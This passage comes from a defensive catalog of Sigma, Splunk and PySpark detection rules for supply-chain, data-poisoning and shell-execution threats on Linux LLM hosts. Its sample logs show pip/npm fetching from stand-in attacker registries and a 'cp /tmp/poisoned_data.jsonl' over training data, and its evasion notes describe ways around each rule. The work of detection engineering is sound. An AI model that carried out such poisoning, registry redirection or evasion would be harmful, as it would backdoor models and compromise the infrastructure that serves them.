    mitre: ["T1195.001"],
    category: "AI Security",
    maturity: "experimental",
    severity: "medium",
    tags: ["llm", "supply-chain", "linux", "package-install", "owasp-llm03"],
    author: "Detection Engineering Team",
    updated: "2025-01-15",
    sigma: `title: LLM Host Installing Python Packages From Unapproved Repository
owasp top 10: LLM03:2025 Supply Chain
id: 1368acf2-3d53-4f95-976a-4eb9e1bfedf9
status: experimental
logsource:
  category: network_connection
  product: linux
detection:
  selection_proc:
    Image|endswith:
      - /pip
      - /pip3
      - /python
      - /python3
      - /uv
  filter_allowed:
    DestinationHostname|endswith:
      - pypi.org
      - files.pythonhosted.org
      - .oracle.com
      - .oraclecloud.com
  condition: selection_proc and not filter_allowed
fields:
  - Image
  - DestinationHostname
  - DestinationIp
  - DestinationPort
  - User
  - ComputerName
level: medium
tags:
  - attack.resource-development
  - ai.llm
  - llm03.supply-chain`,
    splunk: `index=linux_network sourcetype=network_connection
  image IN ("*/pip", "*/pip3", "*/python", "*/python3", "*/uv")
  NOT (dest_hostname="*.pypi.org" OR dest_hostname="*.pythonhosted.org" OR dest_hostname="*.oracle.com" OR dest_hostname="*.oraclecloud.com")
| table _time, computer_name, user, image, dest_hostname, dest_ip, dest_port
| sort -_time`,
    pyspark: `result = spark.sql("""
    SELECT timestamp, computer_name AS host, user,
           image, destination_hostname, destination_ip,
           'llm03-001' AS detection_id,
           'LLM Host Installing Python Packages From Unapproved Repository' AS detection_name,
           'medium' AS severity
    FROM linux_network_events
    WHERE (image LIKE '%/pip' OR image LIKE '%/pip3' OR image LIKE '%/python3' OR image LIKE '%/uv')
      AND destination_hostname NOT LIKE '%.pypi.org'
      AND destination_hostname NOT LIKE '%.pythonhosted.org'
      AND destination_hostname NOT LIKE '%.oracle.com'
      AND destination_hostname NOT LIKE '%.oraclecloud.com'
""")`,
    sampleLogs: [
      `{"timestamp":"2025-01-15T08:14:22Z","computer_name":"llm-host-01","user":"root","image":"/usr/bin/pip3","destination_hostname":"malicious-pypi-mirror.example.com","destination_ip":"203.0.113.55","destination_port":443}`,
    ],
    requiredFields: ["image", "destination_hostname", "destination_ip", "user", "computer_name"],
    falsePositives: [
      "Internal PyPI mirrors hosted on non-standard domains",
      "Air-gapped environments using custom package repositories",
    ],
    tuningGuidance:
      "Add internal mirror hostnames to the filter_allowed list. Consider blocking outbound pip traffic entirely via egress firewall on production LLM hosts.",
    deploymentNotes:
      "Requires network connection telemetry with process attribution. Most effective when combined with an egress allowlist enforced at the network layer.",
    evasionConsiderations:
      "Attacker may use a typosquatted package on the legitimate PyPI index, which would not be caught by this hostname-based detection.",
    problemStatement:
      "LLM runtimes have large Python dependency trees. Installing packages from unapproved repositories can introduce backdoored or malicious libraries that compromise the model serving infrastructure.",
  },
  {
    id: "llm03-002",
    title: "LLM Host Installing Node Packages From Unapproved Registry",
    description:
      "Detects npm, yarn, or Node processes connecting to package registries other than the approved npm registry or OCI mirrors. Unapproved registries may serve malicious packages targeting LLM toolchain components.",
    platform: ["Linux", "AI/ML"],
    mitre: ["T1195.001"],
    category: "AI Security",
    maturity: "experimental",
    severity: "medium",
    tags: ["llm", "supply-chain", "linux", "package-install", "owasp-llm03"],
    author: "Detection Engineering Team",
    updated: "2025-01-15",
    sigma: `title: LLM Host Installing Node Packages From Unapproved Registry
owasp top 10: LLM03:2025 Supply Chain
id: fc9bade8-f2f8-463f-8898-3f0b261a28b5
status: experimental
logsource:
  category: network_connection
  product: linux
detection:
  selection_proc:
    Image|endswith:
      - /npm
      - /yarn
      - /node
  filter_allowed:
    DestinationHostname|endswith:
      - registry.npmjs.org
      - .oracle.com
      - .oraclecloud.com
  condition: selection_proc and not filter_allowed
fields:
  - Image
  - DestinationHostname
  - DestinationIp
  - User
  - ComputerName
level: medium
tags:
  - attack.resource-development
  - ai.llm
  - llm03.supply-chain`,
    splunk: `index=linux_network sourcetype=network_connection
  image IN ("*/npm", "*/yarn", "*/node")
  NOT (dest_hostname="registry.npmjs.org" OR dest_hostname="*.oracle.com" OR dest_hostname="*.oraclecloud.com")
| table _time, computer_name, user, image, dest_hostname, dest_ip
| sort -_time`,
    pyspark: `result = spark.sql("""
    SELECT timestamp, computer_name AS host, user,
           image, destination_hostname, destination_ip,
           'llm03-002' AS detection_id,
           'LLM Host Installing Node Packages From Unapproved Registry' AS detection_name,
           'medium' AS severity
    FROM linux_network_events
    WHERE (image LIKE '%/npm' OR image LIKE '%/yarn' OR image LIKE '%/node')
      AND destination_hostname NOT LIKE '%registry.npmjs.org'
      AND destination_hostname NOT LIKE '%.oracle.com'
      AND destination_hostname NOT LIKE '%.oraclecloud.com'
""")`,
    sampleLogs: [
      `{"timestamp":"2025-01-15T09:45:00Z","computer_name":"llm-host-02","user":"llm_svc","image":"/usr/bin/npm","destination_hostname":"custom-registry.attacker.io","destination_ip":"198.51.100.10","destination_port":443}`,
    ],
    requiredFields: ["image", "destination_hostname", "destination_ip", "user", "computer_name"],
    falsePositives: [
      "Internal npm registry mirrors with non-standard hostnames",
    ],
    tuningGuidance:
      "Add approved internal registry hostnames to the allowlist. Enforce registry configuration via .npmrc on LLM hosts.",
    deploymentNotes:
      "Requires network connection telemetry with process context. Most Node-based LLM tooling should not install packages at runtime on production hosts.",
    evasionConsiderations:
      "Attacker may compromise a package on the legitimate npm registry (dependency confusion or typosquatting) rather than using a custom registry.",
    problemStatement:
      "Node-based LLM tooling and MCP servers rely on npm packages. Connections to unapproved registries indicate potential supply chain compromise of the LLM tool ecosystem.",
  },
  {
    id: "llm03-003",
    title: "LLM Runtime Writing New Plugin Or Extension Files",
    description:
      "Detects LLM service processes writing files to plugin, extension, MCP, or tools directories. Runtime modification of plugin paths suggests supply chain tampering or a prompt-injection-driven persistence mechanism.",
    platform: ["Linux", "AI/ML"],
    mitre: ["T1547.001"],
    category: "AI Security",
    maturity: "experimental",
    severity: "medium",
    tags: ["llm", "persistence", "linux", "plugin", "owasp-llm03"],
    author: "Detection Engineering Team",
    updated: "2025-01-15",
    sigma: `title: LLM Runtime Writing New Plugin Or Extension Files
owasp top 10: LLM03:2025 Supply Chain
id: 70f0c0b3-2393-488e-86a6-873b95daabc7
status: experimental
logsource:
  category: file_event
  product: linux
detection:
  selection_proc:
    Image|contains:
      - /opt/llm/
      - /srv/llm/
      - /app/llm/
      - /models/
      - /var/lib/llm/
      - /home/opc/llm/
  selection_file:
    TargetFilename|contains:
      - /plugins/
      - /extensions/
      - /mcp/
      - /tools/
  condition: selection_proc and selection_file
fields:
  - Image
  - TargetFilename
  - User
  - ComputerName
level: medium
tags:
  - attack.persistence
  - ai.llm
  - llm03.supply-chain`,
    splunk: `index=linux_audit sourcetype=auditd_file
  image IN ("*/opt/llm/*", "*/srv/llm/*", "*/app/llm/*", "*/models/*")
  (target_filename="*/plugins/*" OR target_filename="*/extensions/*" OR target_filename="*/mcp/*" OR target_filename="*/tools/*")
| table _time, computer_name, user, image, target_filename
| sort -_time`,
    pyspark: `result = spark.sql("""
    SELECT timestamp, computer_name AS host, user,
           image, target_filename,
           'llm03-003' AS detection_id,
           'LLM Runtime Writing New Plugin Or Extension Files' AS detection_name,
           'medium' AS severity
    FROM linux_file_events
    WHERE (image LIKE '%/opt/llm/%' OR image LIKE '%/srv/llm/%' OR image LIKE '%/app/llm/%')
      AND (target_filename LIKE '%/plugins/%'
        OR target_filename LIKE '%/extensions/%'
        OR target_filename LIKE '%/mcp/%'
        OR target_filename LIKE '%/tools/%')
""")`,
    sampleLogs: [
      `{"timestamp":"2025-01-15T11:33:47Z","computer_name":"llm-host-01","user":"llm_svc","image":"/opt/llm/app/plugin_manager.py","target_filename":"/opt/llm/mcp/new_tool.py","event_type":"file_create"}`,
    ],
    requiredFields: ["image", "target_filename", "user", "computer_name"],
    falsePositives: [
      "Legitimate plugin installation workflows during LLM service updates",
      "Approved MCP tool deployment pipelines",
    ],
    tuningGuidance:
      "Establish a file integrity baseline for plugin directories. Alert on any writes outside approved deployment windows.",
    deploymentNotes:
      "Requires file event auditing on plugin and tools directories. Combine with file integrity monitoring for best coverage.",
    evasionConsiderations:
      "Attacker may modify existing plugin files rather than creating new ones, bypassing creation-based detection.",
    problemStatement:
      "Plugin and MCP tool directories define the capabilities available to the LLM agent. Runtime writes to these paths indicate an attempt to expand agent capabilities or establish persistence through tool injection.",
  },
  {
    id: "llm03-004",
    title: "LLM Service Loading Model From Temporary Directory",
    description:
      "Detects LLM runtime processes (Python, ollama, vllm) executing with command-line arguments referencing temporary directories for model loading. Loading model weights from /tmp or /dev/shm suggests a staged supply chain attack replacing legitimate model files.",
    platform: ["Linux", "AI/ML"],
    mitre: ["T1195.001"],
    category: "AI Security",
    maturity: "experimental",
    severity: "high",
    tags: ["llm", "supply-chain", "linux", "model-load", "owasp-llm03"],
    author: "Detection Engineering Team",
    updated: "2025-01-15",
    sigma: `title: LLM Service Loading Model From Temporary Directory
owasp top 10: LLM03:2025 Supply Chain
id: 8dc3ee68-2bce-43fa-8e13-4de1241fce43
status: experimental
logsource:
  category: process_creation
  product: linux
detection:
  selection_proc:
    Image|endswith:
      - /python
      - /python3
      - /ollama
      - /vllm
  selection_cmd:
    CommandLine|contains:
      - /tmp/
      - /var/tmp/
      - /dev/shm/
  condition: selection_proc and selection_cmd
fields:
  - Image
  - CommandLine
  - User
  - ComputerName
level: high
tags:
  - attack.execution
  - ai.llm
  - llm03.supply-chain`,
    splunk: `index=linux_audit sourcetype=auditd_process
  image IN ("*/python", "*/python3", "*/ollama", "*/vllm")
  (command_line="*/tmp/*" OR command_line="*/var/tmp/*" OR command_line="*/dev/shm/*")
| table _time, computer_name, user, image, command_line
| sort -_time`,
    pyspark: `result = spark.sql("""
    SELECT timestamp, computer_name AS host, user,
           image, command_line,
           'llm03-004' AS detection_id,
           'LLM Service Loading Model From Temporary Directory' AS detection_name,
           'high' AS severity
    FROM linux_audit_events
    WHERE (image LIKE '%/python' OR image LIKE '%/python3' OR image LIKE '%/ollama' OR image LIKE '%/vllm')
      AND (command_line LIKE '%/tmp/%' OR command_line LIKE '%/var/tmp/%' OR command_line LIKE '%/dev/shm/%')
""")`,
    sampleLogs: [
      `{"timestamp":"2025-01-15T07:55:12Z","computer_name":"llm-host-02","user":"llm_svc","image":"/usr/bin/python3","command_line":"python3 serve.py --model /tmp/replaced_model.gguf"}`,
    ],
    requiredFields: ["image", "command_line", "user", "computer_name"],
    falsePositives: [
      "Development environments loading test models from temp directories",
    ],
    tuningGuidance:
      "Production LLM hosts should load models exclusively from versioned, signed paths. Any temporary path model load should be treated as high priority.",
    deploymentNotes:
      "Requires process creation telemetry with full command-line capture. Model path validation can also be implemented at the LLM service configuration layer.",
    evasionConsiderations:
      "Attacker may modify the model file in place at its approved path rather than loading from a temporary location.",
    problemStatement:
      "Model weight files loaded from temporary directories have likely bypassed integrity verification controls. This is a key indicator of a supply chain attack where a legitimate model has been replaced with a tampered version.",
  },
  {
    id: "llm03-005",
    title: "LLM Host Modifying Package Or Dependency Configuration",
    description:
      "Detects LLM service processes modifying Python or Node package configuration files (requirements.txt, pyproject.toml, package.json, etc.). Runtime modification of dependency configurations can redirect package resolution to attacker-controlled sources.",
    platform: ["Linux", "AI/ML"],
    mitre: ["T1547.001"],
    category: "AI Security",
    maturity: "experimental",
    severity: "medium",
    tags: ["llm", "persistence", "linux", "package-config", "owasp-llm03"],
    author: "Detection Engineering Team",
    updated: "2025-01-15",
    sigma: `title: LLM Host Modifying Package Or Dependency Configuration
owasp top 10: LLM03:2025 Supply Chain
id: ea73d54a-ac4b-4183-950b-678c0ac9c5f1
status: experimental
logsource:
  category: file_event
  product: linux
detection:
  selection_proc:
    Image|contains:
      - /opt/llm/
      - /srv/llm/
      - /app/llm/
      - /models/
      - /var/lib/llm/
      - /home/opc/llm/
  selection_file:
    TargetFilename|endswith:
      - requirements.txt
      - poetry.lock
      - pyproject.toml
      - package.json
      - package-lock.json
      - pip.conf
  condition: selection_proc and selection_file
fields:
  - Image
  - TargetFilename
  - User
  - ComputerName
level: medium
tags:
  - attack.persistence
  - ai.llm
  - llm03.supply-chain`,
    splunk: `index=linux_audit sourcetype=auditd_file
  image IN ("*/opt/llm/*", "*/srv/llm/*", "*/app/llm/*", "*/models/*")
  (target_filename="*requirements.txt" OR target_filename="*pyproject.toml" OR target_filename="*package.json" OR target_filename="*pip.conf")
| table _time, computer_name, user, image, target_filename
| sort -_time`,
    pyspark: `result = spark.sql("""
    SELECT timestamp, computer_name AS host, user,
           image, target_filename,
           'llm03-005' AS detection_id,
           'LLM Host Modifying Package Or Dependency Configuration' AS detection_name,
           'medium' AS severity
    FROM linux_file_events
    WHERE (image LIKE '%/opt/llm/%' OR image LIKE '%/srv/llm/%' OR image LIKE '%/app/llm/%')
      AND (target_filename LIKE '%requirements.txt'
        OR target_filename LIKE '%pyproject.toml'
        OR target_filename LIKE '%package.json'
        OR target_filename LIKE '%pip.conf')
""")`,
    sampleLogs: [
      `{"timestamp":"2025-01-15T12:10:05Z","computer_name":"llm-host-03","user":"llm_svc","image":"/opt/llm/app/setup_handler.py","target_filename":"/opt/llm/requirements.txt","event_type":"file_modify"}`,
    ],
    requiredFields: ["image", "target_filename", "user", "computer_name"],
    falsePositives: [
      "Automated dependency update pipelines running under the LLM service account",
    ],
    tuningGuidance:
      "Package configuration files should be immutable on production hosts. Any runtime write should alert regardless of source process.",
    deploymentNotes:
      "Combine with file integrity monitoring on dependency files. Consider making these files read-only via filesystem permissions.",
    evasionConsiderations:
      "Attacker may modify pip.conf or .npmrc in the user home directory rather than the project directory, redirecting resolution without touching project files.",
    problemStatement:
      "Package and dependency configuration files define what code runs in the LLM environment. Runtime modification of these files by the LLM service itself indicates an attempt to inject malicious dependencies on the next package install or service restart.",
  },

  // ── LLM04: Data and Model Poisoning ──────────────────────────────────────
  {
    id: "llm04-001",
    title: "LLM Training Or Fine-Tune Data Files Modified",
    description:
      "Detects LLM service processes modifying training dataset files (JSONL, Parquet, CSV, Arrow) in training or fine-tuning directories. Modification of training data at runtime is a strong indicator of data poisoning.",
    platform: ["Linux", "AI/ML"],
    mitre: ["T1565.001"],
    category: "AI Security",
    maturity: "experimental",
    severity: "high",
    tags: ["llm", "data-poisoning", "linux", "training-data", "owasp-llm04"],
    author: "Detection Engineering Team",
    updated: "2025-01-15",
    sigma: `title: LLM Training Or Fine Tune Data Files Modified
owasp top 10: LLM04:2025 Data and Model Poisoning
id: 3413651e-e845-4291-8f69-988fd9d2e39e
status: experimental
logsource:
  category: file_event
  product: linux
detection:
  selection_proc:
    Image|contains:
      - /opt/llm/
      - /srv/llm/
      - /app/llm/
      - /models/
      - /var/lib/llm/
      - /home/opc/llm/
  selection_file:
    TargetFilename|endswith:
      - .jsonl
      - .parquet
      - .csv
      - .arrow
  selection_path:
    TargetFilename|contains:
      - /training/
      - /finetune/
      - /datasets/
      - /embeddings/
  condition: selection_proc and selection_file and selection_path
fields:
  - Image
  - TargetFilename
  - User
  - ComputerName
level: high
tags:
  - attack.impact
  - ai.llm
  - llm04.data-and-model-poisoning`,
    splunk: `index=linux_audit sourcetype=auditd_file
  image IN ("*/opt/llm/*", "*/srv/llm/*", "*/app/llm/*", "*/models/*")
  (target_filename="*.jsonl" OR target_filename="*.parquet" OR target_filename="*.csv")
  (target_filename="*/training/*" OR target_filename="*/finetune/*" OR target_filename="*/datasets/*")
| table _time, computer_name, user, image, target_filename
| sort -_time`,
    pyspark: `result = spark.sql("""
    SELECT timestamp, computer_name AS host, user,
           image, target_filename,
           'llm04-001' AS detection_id,
           'LLM Training Or Fine-Tune Data Files Modified' AS detection_name,
           'high' AS severity
    FROM linux_file_events
    WHERE (image LIKE '%/opt/llm/%' OR image LIKE '%/srv/llm/%' OR image LIKE '%/app/llm/%')
      AND (target_filename LIKE '%.jsonl' OR target_filename LIKE '%.parquet' OR target_filename LIKE '%.csv')
      AND (target_filename LIKE '%/training/%' OR target_filename LIKE '%/finetune/%' OR target_filename LIKE '%/datasets/%')
""")`,
    sampleLogs: [
      `{"timestamp":"2025-01-15T06:20:33Z","computer_name":"llm-host-01","user":"llm_svc","image":"/opt/llm/app/data_processor.py","target_filename":"/opt/llm/datasets/training/instructions.jsonl","event_type":"file_modify"}`,
    ],
    requiredFields: ["image", "target_filename", "user", "computer_name"],
    falsePositives: [
      "Approved active learning or online fine-tuning pipelines that update training data",
    ],
    tuningGuidance:
      "Training data directories should be immutable during inference. Any write event outside a designated training window should alert.",
    deploymentNotes:
      "Requires file event auditing with write (-p w) permissions on training and dataset directories. Consider using immutable filesystem flags on production dataset paths.",
    evasionConsiderations:
      "Attacker may poison data upstream in the data pipeline before it reaches the monitored host, bypassing local file-write detection.",
    problemStatement:
      "Modifying training or fine-tuning datasets at runtime can cause subsequent model updates to produce biased, backdoored, or attacker-aligned outputs, representing a persistent and difficult-to-detect form of model compromise.",
  },
  {
    id: "llm04-002",
    title: "LLM Model Weights Modified On Disk",
    description:
      "Detects LLM service processes writing to model weight files (.bin, .safetensors, .gguf, .pt). Model weight modification at runtime is a critical indicator of model poisoning or backdoor injection.",
    platform: ["Linux", "AI/ML"],
    mitre: ["T1565.001"],
    category: "AI Security",
    maturity: "experimental",
    severity: "high",
    tags: ["llm", "data-poisoning", "linux", "model-weights", "owasp-llm04"],
    author: "Detection Engineering Team",
    updated: "2025-01-15",
    sigma: `title: LLM Model Weights Modified On Disk
owasp top 10: LLM04:2025 Data and Model Poisoning
id: 01722838-4b85-4473-bf1c-ae717ab2575b
status: experimental
logsource:
  category: file_event
  product: linux
detection:
  selection_proc:
    Image|contains:
      - /opt/llm/
      - /srv/llm/
      - /app/llm/
      - /models/
      - /var/lib/llm/
      - /home/opc/llm/
  selection_file:
    TargetFilename|endswith:
      - .bin
      - .safetensors
      - .gguf
      - .pt
  condition: selection_proc and selection_file
fields:
  - Image
  - TargetFilename
  - User
  - ComputerName
level: high
tags:
  - attack.impact
  - ai.llm
  - llm04.data-and-model-poisoning`,
    splunk: `index=linux_audit sourcetype=auditd_file
  image IN ("*/opt/llm/*", "*/srv/llm/*", "*/app/llm/*", "*/models/*")
  (target_filename="*.bin" OR target_filename="*.safetensors" OR target_filename="*.gguf" OR target_filename="*.pt")
  NOT event_type="read"
| table _time, computer_name, user, image, target_filename, event_type
| sort -_time`,
    pyspark: `result = spark.sql("""
    SELECT timestamp, computer_name AS host, user,
           image, target_filename, event_type,
           'llm04-002' AS detection_id,
           'LLM Model Weights Modified On Disk' AS detection_name,
           'high' AS severity
    FROM linux_file_events
    WHERE (image LIKE '%/opt/llm/%' OR image LIKE '%/srv/llm/%' OR image LIKE '%/models/%')
      AND (target_filename LIKE '%.bin'
        OR target_filename LIKE '%.safetensors'
        OR target_filename LIKE '%.gguf'
        OR target_filename LIKE '%.pt')
      AND event_type != 'read'
""")`,
    sampleLogs: [
      `{"timestamp":"2025-01-15T02:11:09Z","computer_name":"llm-host-02","user":"llm_svc","image":"/opt/llm/app/model_updater.py","target_filename":"/models/llama3/model.safetensors","event_type":"file_modify"}`,
    ],
    requiredFields: ["image", "target_filename", "event_type", "user", "computer_name"],
    falsePositives: [
      "Legitimate model fine-tuning or quantisation processes writing updated weights",
      "Model download and caching utilities writing weight files for the first time",
    ],
    tuningGuidance:
      "Exclude known model download and caching processes. Treat any weight modification outside a scheduled maintenance window as critical.",
    deploymentNotes:
      "Model weight files should be write-protected in production. Enabling immutable file attributes (chattr +i) on model weight paths provides a stronger preventive control.",
    evasionConsiderations:
      "Attacker with root access can remove immutable attributes before modifying weights. Combine with privileged access monitoring.",
    problemStatement:
      "Model weight files are the core of LLM behaviour. Direct modification of these files while the service is running can inject backdoors, alter model alignment, or cause the model to produce attacker-desired outputs.",
  },
  {
    id: "llm04-003",
    title: "Unexpected Process Editing Embedding Or Retrieval Data Store",
    description:
      "Detects non-LLM system utilities (sed, awk, Python, Perl) writing to vector database or embedding store directories. This indicates out-of-band modification of the retrieval layer, a key data poisoning vector for RAG-based systems.",
    platform: ["Linux", "AI/ML"],
    mitre: ["T1565.001"],
    category: "AI Security",
    maturity: "experimental",
    severity: "medium",
    tags: ["llm", "data-poisoning", "linux", "vector-db", "owasp-llm04"],
    author: "Detection Engineering Team",
    updated: "2025-01-15",
    sigma: `title: Unexpected Process Editing Embedding Or Retrieval Data Store
owasp top 10: LLM04:2025 Data and Model Poisoning
id: 620015ba-df91-4f88-b31c-16754bd6f9f2
status: experimental
logsource:
  category: file_event
  product: linux
detection:
  selection_proc:
    Image|endswith:
      - /sed
      - /awk
      - /python
      - /python3
      - /perl
  selection_file:
    TargetFilename|contains:
      - /embeddings/
      - /vector/
      - /faiss/
      - /chroma/
      - /qdrant/
  condition: selection_proc and selection_file
fields:
  - Image
  - TargetFilename
  - User
  - ComputerName
level: medium
tags:
  - attack.impact
  - ai.llm
  - llm04.data-and-model-poisoning`,
    splunk: `index=linux_audit sourcetype=auditd_file
  image IN ("*/sed", "*/awk", "*/python", "*/python3", "*/perl")
  (target_filename="*/embeddings/*" OR target_filename="*/vector/*" OR target_filename="*/faiss/*" OR target_filename="*/chroma/*" OR target_filename="*/qdrant/*")
| table _time, computer_name, user, image, target_filename
| sort -_time`,
    pyspark: `result = spark.sql("""
    SELECT timestamp, computer_name AS host, user,
           image, target_filename,
           'llm04-003' AS detection_id,
           'Unexpected Process Editing Embedding Or Retrieval Data Store' AS detection_name,
           'medium' AS severity
    FROM linux_file_events
    WHERE (image LIKE '%/sed' OR image LIKE '%/awk' OR image LIKE '%/python3' OR image LIKE '%/perl')
      AND (target_filename LIKE '%/embeddings/%'
        OR target_filename LIKE '%/vector/%'
        OR target_filename LIKE '%/faiss/%'
        OR target_filename LIKE '%/chroma/%'
        OR target_filename LIKE '%/qdrant/%')
""")`,
    sampleLogs: [
      `{"timestamp":"2025-01-15T03:44:22Z","computer_name":"llm-host-01","user":"opc","image":"/usr/bin/python3","target_filename":"/opt/llm/vector/chroma/data.sqlite","event_type":"file_modify"}`,
    ],
    requiredFields: ["image", "target_filename", "user", "computer_name"],
    falsePositives: [
      "Approved embedding update pipelines that use Python scripts to refresh the vector store",
    ],
    tuningGuidance:
      "Create a process allowlist specific to the vector store management tooling. Alert on any process outside this list writing to embedding paths.",
    deploymentNotes:
      "Requires file event auditing on vector database paths. Access to vector store directories should be restricted to the approved indexing service account.",
    evasionConsiderations:
      "Attacker may use the vector database's native API (HTTP endpoint) to inject poisoned embeddings, bypassing file-based detection entirely.",
    problemStatement:
      "Vector and embedding stores are the retrieval backbone of RAG systems. Out-of-band modification by unexpected processes can inject poisoned documents that cause the LLM to produce attacker-controlled outputs.",
  },
  {
    id: "llm04-004",
    title: "OCI CLI Writing New Training Data From Object Storage",
    description:
      "Detects the OCI CLI being spawned from an LLM service process to download data from object storage to training or dataset paths. This pattern indicates an attempt to replace or supplement training data with potentially poisoned content from external storage.",
    platform: ["Linux", "AI/ML", "OCI"],
    mitre: ["T1105"],
    category: "AI Security",
    maturity: "experimental",
    severity: "medium",
    tags: ["llm", "data-poisoning", "linux", "oci", "owasp-llm04"],
    author: "Detection Engineering Team",
    updated: "2025-01-15",
    sigma: `title: OCI CLI Writing New Training Data From Object Storage
owasp top 10: LLM04:2025 Data and Model Poisoning
id: 3e551771-0c70-4ce0-ba45-8247277b6356
status: experimental
logsource:
  category: process_creation
  product: linux
detection:
  selection_parent:
    ParentImage|contains:
      - /opt/llm/
      - /srv/llm/
      - /app/llm/
      - /models/
      - /var/lib/llm/
      - /home/opc/llm/
  selection_child:
    Image|endswith:
      - /oci
  selection_cmd:
    CommandLine|contains:
      - object-storage
      - os object
      - bulk-download
      - get --name
  condition: selection_parent and selection_child and selection_cmd
fields:
  - ParentImage
  - Image
  - CommandLine
  - User
  - ComputerName
level: medium
tags:
  - attack.collection
  - ai.llm
  - llm04.data-and-model-poisoning`,
    splunk: `index=linux_audit sourcetype=auditd_process
  parent_image IN ("*/opt/llm/*", "*/srv/llm/*", "*/app/llm/*", "*/models/*")
  image="*/oci"
  (command_line="*object-storage*" OR command_line="*os object*" OR command_line="*bulk-download*")
| table _time, computer_name, user, image, command_line, parent_image
| sort -_time`,
    pyspark: `result = spark.sql("""
    SELECT timestamp, computer_name AS host, user,
           image, command_line, parent_image,
           'llm04-004' AS detection_id,
           'OCI CLI Writing New Training Data From Object Storage' AS detection_name,
           'medium' AS severity
    FROM linux_audit_events
    WHERE (parent_image LIKE '%/opt/llm/%' OR parent_image LIKE '%/srv/llm/%')
      AND image LIKE '%/oci'
      AND (command_line LIKE '%object-storage%' OR command_line LIKE '%os object%' OR command_line LIKE '%bulk-download%')
""")`,
    sampleLogs: [
      `{"timestamp":"2025-01-15T05:30:11Z","computer_name":"llm-host-02","user":"llm_svc","image":"/usr/local/bin/oci","command_line":"oci os object bulk-download --bucket-name ext-data --dest-dir /opt/llm/datasets/training/","parent_image":"/opt/llm/app/data_sync.py"}`,
    ],
    requiredFields: ["image", "command_line", "parent_image", "user", "computer_name"],
    falsePositives: [
      "Approved data pipeline jobs that pull updated training datasets from OCI Object Storage",
    ],
    tuningGuidance:
      "Baseline the expected OCI bucket names and destination paths for approved data pipelines. Alert on any bucket or destination path outside this baseline.",
    deploymentNotes:
      "Requires process creation telemetry with parent process attribution. The OCI CLI invocation will reveal the target bucket and destination path in the command line.",
    evasionConsiderations:
      "Attacker may use the OCI Python SDK directly within the LLM process to download poisoned data without spawning the OCI CLI binary.",
    problemStatement:
      "An LLM service downloading training data from object storage at runtime, outside an approved pipeline, suggests an attempt to introduce poisoned data that will bias or backdoor model behaviour after retraining.",
  },
  {
    id: "llm04-005",
    title: "LLM Dataset Replaced From Temporary Or User Home Path",
    description:
      "Detects file copy, move, or rsync operations replacing training or embedding datasets with files sourced from temporary or user home directories. This is a classic pattern for staged data poisoning attacks.",
    platform: ["Linux", "AI/ML"],
    mitre: ["T1565.001"],
    category: "AI Security",
    maturity: "experimental",
    severity: "high",
    tags: ["llm", "data-poisoning", "linux", "dataset-replace", "owasp-llm04"],
    author: "Detection Engineering Team",
    updated: "2025-01-15",
    sigma: `title: LLM Dataset Replaced From Temporary Or User Home Path
owasp top 10: LLM04:2025 Data and Model Poisoning
id: 51e303ce-36ad-402e-9ae7-18ce644e02ed
status: experimental
logsource:
  category: process_creation
  product: linux
detection:
  selection_proc:
    Image|endswith:
      - /cp
      - /mv
      - /rsync
  selection_cmd:
    CommandLine|contains:
      - /tmp/
      - /var/tmp/
      - /home/
  selection_target:
    CommandLine|contains:
      - /training/
      - /datasets/
      - /embeddings/
  condition: selection_proc and selection_cmd and selection_target
fields:
  - Image
  - CommandLine
  - User
  - ComputerName
level: high
tags:
  - attack.impact
  - ai.llm
  - llm04.data-and-model-poisoning`,
    splunk: `index=linux_audit sourcetype=auditd_process
  image IN ("*/cp", "*/mv", "*/rsync")
  (command_line="*/tmp/*" OR command_line="*/var/tmp/*" OR command_line="*/home/*")
  (command_line="*/training/*" OR command_line="*/datasets/*" OR command_line="*/embeddings/*")
| table _time, computer_name, user, image, command_line
| sort -_time`,
    pyspark: `result = spark.sql("""
    SELECT timestamp, computer_name AS host, user,
           image, command_line,
           'llm04-005' AS detection_id,
           'LLM Dataset Replaced From Temporary Or User Home Path' AS detection_name,
           'high' AS severity
    FROM linux_audit_events
    WHERE (image LIKE '%/cp' OR image LIKE '%/mv' OR image LIKE '%/rsync')
      AND (command_line LIKE '%/tmp/%' OR command_line LIKE '%/var/tmp/%' OR command_line LIKE '%/home/%')
      AND (command_line LIKE '%/training/%' OR command_line LIKE '%/datasets/%' OR command_line LIKE '%/embeddings/%')
""")`,
    sampleLogs: [
      `{"timestamp":"2025-01-15T04:02:55Z","computer_name":"llm-host-03","user":"opc","image":"/bin/cp","command_line":"cp /tmp/poisoned_data.jsonl /opt/llm/datasets/training/instructions.jsonl"}`,
    ],
    requiredFields: ["image", "command_line", "user", "computer_name"],
    falsePositives: [
      "Legitimate data preparation scripts that stage files in /tmp before moving to dataset paths",
    ],
    tuningGuidance:
      "Cross-reference the source file with known approved data pipeline outputs. Alert on any replacement of core instruction-tuning or RLHF datasets.",
    deploymentNotes:
      "Dataset paths should have write permissions restricted to the approved data pipeline service account only.",
    evasionConsiderations:
      "Attacker may poison the source file at the upstream object storage level before the approved pipeline copies it to the dataset path.",
    problemStatement:
      "Replacing training datasets from staging areas is the final step of a data poisoning attack. Detecting this file movement prevents poisoned data from being used in the next model fine-tuning run.",
  },

  // ── LLM05: Improper Output Handling ──────────────────────────────────────
  {
    id: "llm05-001",
    title: "LLM Service Spawning Shell With Inline Command",
    description:
      "Detects LLM service processes spawning bash or sh with an inline -c command argument. This indicates model-generated or injected shell commands are being executed directly, representing a critical code injection risk.",
    platform: ["Linux", "AI/ML"],
    mitre: ["T1059.004"],
    category: "AI Security",
    maturity: "experimental",
    severity: "high",
    tags: ["llm", "improper-output", "linux", "shell-execution", "owasp-llm05"],
    author: "Detection Engineering Team",
    updated: "2025-01-15",
    sigma: `title: LLM Service Spawning Shell With Inline Command
owasp top 10: LLM05:2025 Improper Output Handling
id: ca4c8a5e-2d0f-4d2d-907e-fcf8c6997a5e
status: experimental
logsource:
  category: process_creation
  product: linux
detection:
  selection_parent:
    ParentImage|contains:
      - /opt/llm/
      - /srv/llm/
      - /app/llm/
      - /models/
      - /var/lib/llm/
      - /home/opc/llm/
  selection_child:
    Image|endswith:
      - /bash
      - /sh
  selection_cmd:
    CommandLine|contains:
      - ' -c '
      - 'bash -c'
      - 'sh -c'
  condition: selection_parent and selection_child and selection_cmd
fields:
  - ParentImage
  - Image
  - CommandLine
  - User
  - ComputerName
level: high
tags:
  - attack.execution
  - ai.llm
  - llm05.improper-output-handling`,
    splunk: `index=linux_audit sourcetype=auditd_process
